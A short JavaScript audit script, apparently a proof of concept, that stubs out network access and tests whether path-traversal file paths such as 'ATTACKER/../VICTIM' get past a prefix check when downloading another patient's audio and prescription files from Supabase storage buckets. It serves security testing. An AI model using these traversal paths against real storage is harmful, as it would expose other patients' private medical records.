// Offline audit only. All fetches are intercepted; no external request is made.
import { createClient } from '../../../node_modules/@supabase/supabase-js/dist/main/index.js';
const observed=[];
const client=createClient('https://audit.invalid','synthetic-service-key',{
 auth:{persistSession:false,autoRefreshToken:false},
 global:{fetch:async(input,init)=>{
  observed.push({raw:String(input),normalized:new Request(input,init).url});
  return new Response('synthetic document',{status:200,headers:{'Content-Type':'application/pdf'}});
 }}
});
const attacker='ATTACKER';
const audio=`consultations/${attacker}/../VICTIM/audio.webm`;
console.log(JSON.stringify({audioPassesCurrentPrefixCheck:audio.startsWith(`consultations/${attacker}/`)}));
await client.storage.from('audio-recordings').download(audio);
await client.storage.from('prescriptions').download('/rx/VICTIM/document.pdf');
await client.storage.from('prescriptions').download('../patient-files/patients/VICTIM/document.pdf');
console.log(JSON.stringify(observed,null,2));
